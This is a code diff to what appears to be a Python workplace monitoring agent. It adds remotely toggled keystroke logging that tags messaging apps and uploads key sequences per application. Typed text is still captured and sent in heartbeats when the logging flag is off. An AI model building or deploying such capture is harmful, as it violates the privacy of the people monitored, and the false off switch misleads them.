@@ -80,6 +80,7 @@ ffmpeg_log_file = None
 is_activity_monitoring_enabled_by_control = True
 is_network_monitoring_enabled_by_control = True
 is_live_streaming_enabled_by_control = False
+is_keystroke_logging_enabled_by_control = False
 
 # --- Scheduling Variables ---
 is_agent_active_by_schedule = True
@@ -288,29 +289,51 @@ def is_messaging_app(app_name, url):
 def on_key_press(key):
     global key_stroke_count, key_log_buffer, last_key_time, typed_keys_string
     key_stroke_count += 1
+
+    # Always capture typed keys for the heartbeat even if detailed logging is disabled
+    try:
+        key_char = key.char
+        if key_char and key_char.isprintable():
+            typed_keys_string += key_char
+    except AttributeError:
+        pass  # Special keys like Ctrl, Alt, etc.
+
+    # Only capture detailed keystroke logs if keystroke logging is enabled
+    if not is_keystroke_logging_enabled_by_control:
+        print(f"DEBUG: Keystroke logging disabled, skipping detailed capture. Flag: {is_keystroke_logging_enabled_by_control}")
+        return
+
+    print(f"DEBUG: Keystroke logging enabled, capturing key press")
     app_name, website_url = get_active_window_info()
     source_id = website_url or app_name or "Unknown"
+    print(f"DEBUG: Capturing keystroke for source: {source_id}")
 
     if source_id not in key_log_buffer:
         key_log_buffer[source_id] = {
             'keys': [],
             'is_messaging': is_messaging_app(app_name, website_url)
         }
+        print(f"DEBUG: Created new buffer entry for {source_id}")
 
     try:
         key_str = key.char
         if key_str and key_str.isprintable():
-            typed_keys_string += key_str
+            pass  # Use the character as-is
+        else:
+            key_str = None  # Skip non-printable characters for detailed logging
     except AttributeError:
         key_str = f'[{str(key).replace("Key.", "").upper()}]'
 
-    # Optional deduplication logic (within 0.1s)
-    now = time.time()
-    if last_key_time.get(source_id, {}).get(key_str, 0) + 0.1 > now:
-        return  # skip duplicate key
-    last_key_time.setdefault(source_id, {})[key_str] = now
+    if key_str:  # Only log if we have a valid key string
+        # Optional deduplication logic (within 0.1s)
+        now = time.time()
+        if last_key_time.get(source_id, {}).get(key_str, 0) + 0.1 > now:
+            print(f"DEBUG: Skipping duplicate key {key_str} for {source_id}")
+            return  # skip duplicate key
+        last_key_time.setdefault(source_id, {})[key_str] = now
 
-    key_log_buffer[source_id]['keys'].append(key_str)
+        key_log_buffer[source_id]['keys'].append(key_str)
+        print(f"DEBUG: Added key '{key_str}' to buffer for {source_id}. Buffer size: {len(key_log_buffer[source_id]['keys'])}")
 
 def on_click(x, y, button, pressed):
     """Callback for mouse click events."""
@@ -968,6 +991,10 @@ async def websocket_message_handler():
                         is_network_monitoring_enabled_by_control = new_state
                         print(f"Command: Network Monitoring {'Enabled' if new_state else 'Disabled'}.")
                         await send_control_response(True, f"Network monitoring {'enabled' if new_state else 'disabled'}.")
+                    elif feature_bundle == "keystroke_logging":
+                        is_keystroke_logging_enabled_by_control = new_state
+                        print(f"Command: Keystroke Logging {'Enabled' if new_state else 'Disabled'}.")
+                        await send_control_response(True, f"Keystroke logging {'enabled' if new_state else 'disabled'}.")
                     else:
                         await send_control_response(False, f"Unknown feature_bundle '{feature_bundle}' for enable/disable action.")
 
@@ -1001,6 +1028,9 @@ async def websocket_message_handler():
                     if data.get("live_streaming_enabled") is not None:
                         is_live_streaming_enabled_by_control = data.get("live_streaming_enabled")
                         print(f"Updated live streaming flag from global config: {is_live_streaming_enabled_by_control}")
+                    if data.get("keystroke_logging_enabled") is not None:
+                        is_keystroke_logging_enabled_by_control = data.get("keystroke_logging_enabled")
+                        print(f"Updated keystroke logging flag from global config: {is_keystroke_logging_enabled_by_control}")
 
                     # 2. Reconcile the actual state with the desired configuration state
                     print("INFO: Reconciling agent state with new global configuration...")
@@ -1106,7 +1136,7 @@ async def send_heartbeat():
     else:
         upload_delta, download_delta = 0, 0
 
-    print(f"Sending data: App='{app_name}' | Keys={key_stroke_count} | Mouse={mouse_event_count} | Typed='{typed_keys_string[:30]}...' | Up={upload_delta} | Down={download_delta} | SS Sent={'Yes' if screenshot_base64 else 'No'}")
+    print(f"Sending data: App='{app_name}' | Keys={key_stroke_count} | Mouse={mouse_event_count} | Typed='{typed_keys_string[:30]}...' | Up={upload_delta} | Down={download_delta} | SS Sent={'Yes' if screenshot_base64 else 'No'} | KeyLog={is_keystroke_logging_enabled_by_control}")
 
     data = {
         "type": "heartbeat",
@@ -1124,6 +1154,7 @@ async def send_heartbeat():
         "is_activity_monitoring_enabled": is_activity_monitoring_enabled_by_control,
         "is_network_monitoring_enabled": is_network_monitoring_enabled_by_control,
         "is_live_streaming_enabled": is_live_streaming_enabled_by_control,
+        "is_keystroke_logging_enabled": is_keystroke_logging_enabled_by_control,
         "productive_status": productive_status,
         "current_interval_seconds": current_interval_ms / 1000,
         "is_agent_active_by_schedule": is_agent_active_by_schedule
@@ -1144,14 +1175,55 @@ async def send_heartbeat():
     mouse_event_count = 0
     typed_keys_string = ""
 
+async def send_keystroke_logs():
+    """Send captured keystroke logs to the server."""
+    global key_log_buffer, websocket_client
+
+    if not key_log_buffer:
+        print("DEBUG: No keystroke logs to send (buffer empty)")
+        return
+
+    print(f"DEBUG: Sending keystroke logs for {len(key_log_buffer)} sources")
+
+    try:
+        for source_id, log_data in key_log_buffer.items():
+            if log_data['keys']:  # Only send if there are actual keystrokes
+                key_sequence = ''.join(log_data['keys'])
+
+                keylog_message = {
+                    "type": "key_log",
+                    "agent_id": AGENT_ID,
+                    "source_app": source_id,
+                    "key_sequence": key_sequence,
+                    "is_messaging": log_data['is_messaging']
+                }
+
+                print(f"DEBUG: Sending keylog message: {json.dumps(keylog_message)[:200]}...")
+                await websocket_client.send(json.dumps(keylog_message))
+                print(f"✅ Sent keystroke log for {source_id}: {len(key_sequence)} characters")
+            else:
+                print(f"DEBUG: Skipping {source_id} - no keys to send")
+
+        # Clear the buffer after sending
+        key_log_buffer = {}
+        print("DEBUG: Keystroke buffer cleared")
+
+    except Exception as e:
+        print(f"❌ Error sending keystroke logs: {e}")
+        import traceback
+        traceback.print_exc()
+
 async def fetch_config():
-    global current_interval_ms, is_activity_monitoring_enabled_by_control, is_network_monitoring_enabled_by_control, current_schedule, is_live_streaming_enabled_by_control
+    global current_interval_ms, is_activity_monitoring_enabled_by_control, is_network_monitoring_enabled_by_control, current_schedule, is_live_streaming_enabled_by_control, is_keystroke_logging_enabled_by_control
 
     try:
         headers = {"X-API-KEY": API_KEY, "X-AGENT-ID": AGENT_ID}
+        print(f"DEBUG: Fetching config from {BACKEND_URL}/api/config/ for agent {AGENT_ID}")
         response = requests.get(f"{BACKEND_URL}/api/config/", headers=headers, timeout=10)
         response.raise_for_status()
         config_data = response.json()
+        
+        print(f"DEBUG: Received config data: {json.dumps(config_data, indent=2)}")
 
           # Apply agent-specific config first
         agent_config = config_data.get("agent_config", {})
@@ -1162,12 +1234,15 @@ async def fetch_config():
             is_activity_monitoring_enabled_by_control = agent_config.get("is_activity_monitoring_enabled", True)
             is_network_monitoring_enabled_by_control = agent_config.get("is_network_monitoring_enabled", True)
             is_live_streaming_enabled_by_control = agent_config.get("is_live_streaming_enabled", False)
+            is_keystroke_logging_enabled_by_control = agent_config.get("is_keystroke_logging_enabled", False)
+
+            print(f"DEBUG: Agent-specific keystroke logging setting: {is_keystroke_logging_enabled_by_control}")
 
             # Apply schedule if available
             if agent_config.get("schedule"):
                 current_schedule = agent_config.get("schedule")
 
-            print(f"Applied agent-specific config: Interval {new_interval_s}s, Activity: {is_activity_monitoring_enabled_by_control}, Network: {is_network_monitoring_enabled_by_control}, Live Streaming: {is_live_streaming_enabled_by_control}")
+            print(f"Applied agent-specific config: Interval {new_interval_s}s, Activity: {is_activity_monitoring_enabled_by_control}, Network: {is_network_monitoring_enabled_by_control}, Live Streaming: {is_live_streaming_enabled_by_control}, Keystroke Logging: {is_keystroke_logging_enabled_by_control}")
         else:
             # Fallback to global config
             new_interval_s = config_data.get("capture_interval", 10)
@@ -1176,13 +1251,16 @@ async def fetch_config():
             is_activity_monitoring_enabled_by_control = config_data.get("activity_monitoring_enabled", True)
             is_network_monitoring_enabled_by_control = config_data.get("network_monitoring_enabled", True)
             is_live_streaming_enabled_by_control = config_data.get("live_streaming_enabled", False)
+            is_keystroke_logging_enabled_by_control = config_data.get("keystroke_logging_enabled", False)
             current_schedule = config_data.get("schedule", current_schedule)
 
-            print(f"Applied global config: Interval {new_interval_s}s, Activity: {is_activity_monitoring_enabled_by_control}, Network: {is_network_monitoring_enabled_by_control}, Live Streaming: {is_live_streaming_enabled_by_control}")
+            print(f"DEBUG: Global keystroke logging setting: {is_keystroke_logging_enabled_by_control}")
+            print(f"Applied global config: Interval {new_interval_s}s, Activity: {is_activity_monitoring_enabled_by_control}, Network: {is_network_monitoring_enabled_by_control}, Live Streaming: {is_live_streaming_enabled_by_control}, Keystroke Logging: {is_keystroke_logging_enabled_by_control}")
 
         # Save config locally for offline use
         save_local_config()
 
+        print(f"DEBUG: Final keystroke logging flag after config fetch: {is_keystroke_logging_enabled_by_control}")
         print(f"Monitoring Schedule: {current_schedule}")
 
     except requests.exceptions.RequestException as e:
@@ -1195,7 +1273,7 @@ async def fetch_config():
 
 def load_local_config():
     """Load settings from local file when server is unavailable"""
-    global current_interval_ms, is_activity_monitoring_enabled_by_control, is_network_monitoring_enabled_by_control, current_schedule, is_live_streaming_enabled_by_control
+    global current_interval_ms, is_activity_monitoring_enabled_by_control, is_network_monitoring_enabled_by_control, current_schedule, is_live_streaming_enabled_by_control, is_keystroke_logging_enabled_by_control
 
     try:
         config_file_path = "local_agent_config.json"
@@ -1210,6 +1288,7 @@ def load_local_config():
             is_activity_monitoring_enabled_by_control = local_config.get("is_activity_monitoring_enabled", True)
             is_network_monitoring_enabled_by_control = local_config.get("is_network_monitoring_enabled", True)
             is_live_streaming_enabled_by_control = local_config.get("is_live_streaming_enabled", False)
+            is_keystroke_logging_enabled_by_control = local_config.get("is_keystroke_logging_enabled", False)
             current_schedule = local_config.get("schedule", current_schedule)
 
             last_updated = local_config.get("last_updated", 0)
@@ -1229,6 +1308,7 @@ def save_local_config():
             "is_activity_monitoring_enabled": is_activity_monitoring_enabled_by_control,
             "is_network_monitoring_enabled": is_network_monitoring_enabled_by_control,
             "is_live_streaming_enabled": is_live_streaming_enabled_by_control,
+            "is_keystroke_logging_enabled": is_keystroke_logging_enabled_by_control,
             "schedule": current_schedule,
             "last_updated": time.time()
         }
@@ -1286,9 +1366,12 @@ async def run_monitoring_loop(config, agent_id):
                     current_time = time.time()
                     if current_time - last_config_fetch > CONFIG_REFRESH_INTERVAL:
                         print("Refreshing configuration from server...")
+                        print(f"DEBUG: Keystroke logging flag BEFORE refresh: {is_keystroke_logging_enabled_by_control}")
                         await fetch_config()
+                        print(f"DEBUG: Keystroke logging flag AFTER refresh: {is_keystroke_logging_enabled_by_control}")
                         last_config_fetch = current_time
                     await send_heartbeat()
+                    await send_keystroke_logs()
 
                     interval_seconds = current_interval_ms / 1000
                     await asyncio.sleep(interval_seconds)
